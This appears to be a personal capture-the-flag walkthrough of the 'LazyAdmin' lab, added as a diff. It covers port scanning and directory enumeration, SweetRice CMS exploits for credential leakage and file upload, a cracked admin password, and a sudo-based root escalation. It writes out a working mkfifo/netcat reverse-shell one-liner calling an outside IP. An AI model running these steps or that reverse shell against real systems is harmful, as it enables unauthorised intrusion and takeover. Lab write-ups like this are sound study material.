@@ -1,0 +1,58 @@
+LazyAdmin
+- *nmap -T4 -A 10.201.82.26*
+	- port 22 - ssh
+	- port 80 - http, apache
+- browser: 10.201.82.26
+- *gobuster dir -u 10.201.82.26 -w /usr/share/wordlists/dirb/common.txt*
+	- */content              (Status: 301) [Size: 314] [--> http://10.201.82.26/content/]*
+- browser 10.201.82.26/content
+	- "Basic CMS SweetRice" installed
+- google: Basic CMS SweetRice exploit
+	- https://www.exploit-db.com/exploits/40718
+- *gobuster dir -u 10.201.82.26/content -w /usr/share/wordlists/dirb/common.txt*
+	- */as                   (Status: 301) [Size: 317] [--> http://10.201.82.26/content/as/]* --> admin login page
+- utilize the above exploit which directs us to **http://10.201.82.26/content/inc/mysql_backup/**
+	- here we get the sql backup file including username and password hash
+	- crackstation.net
+	- **manager:Password123**
+- we use those credentials to login to admin page at http://10.201.82.26/content/as/
+- *nc -nvlp 7777* --> match the port used in shell.phtml
+- with credentials, we can then utilize another SweetRice exploit, "Unrestricted File Upload"
+	- https://www.exploit-db.com/exploits/40716
+	Enter The Target URL(Example : localhost.com) : 10.201.82.26/content
+	Enter Username : manager
+	Enter Password : Password123
+	Enter FileName (Example:.htaccess,shell.php5,index.html) : shell.phtml
+	[+] Sending User&Pass...
+	[+] Login Succssfully...
+	[+] File Uploaded...
+	[+] URL : http://10.201.82.26/content/attachment/shell.phtml
+- browser: http://10.201.82.26/content/attachment/shell.phtml
+- our nc listener receives the connection
+- *whoami*
+	- www-data
+- *cd ../home/itguy*
+- *cat user.txt* --> our first flag
+- *cat mysql_login.txt*
+	- rice:randompass
+- *sudo -l*
+	User www-data may run the following commands on THM-Chal:
+    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
+- *cat /home/itguy/backup.pl* --> a script to run another script
+	#!/usr/bin/perl
+	system("sh", "/etc/copy.sh");
+- *ls -la /home/itguy/backup.pl*
+	-rw-r--r-x 1 root root 47 Nov 29  2019 /home/itguy/backup.pl --> we don't have write access
+- *ls -la /etc/copy.sh*
+	-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
+	- we do have write access on the script that it runs (which will still inherit the root priv.)
+- *cat /etc/copy.sh*
+	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
+	- it is even mostly written for us, we just need to change it to our IP, and create another listener
+- *nc -nvlp 5554*
+- *echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.23.172.46 5554 >/tmp/f" >/etc/copy.sh*
+- *sudo /usr/bin/perl /home/itguy/backup.pl*
+- our listener receives the connection
+- *whoami*
+	- root
+- cat *root.txt*
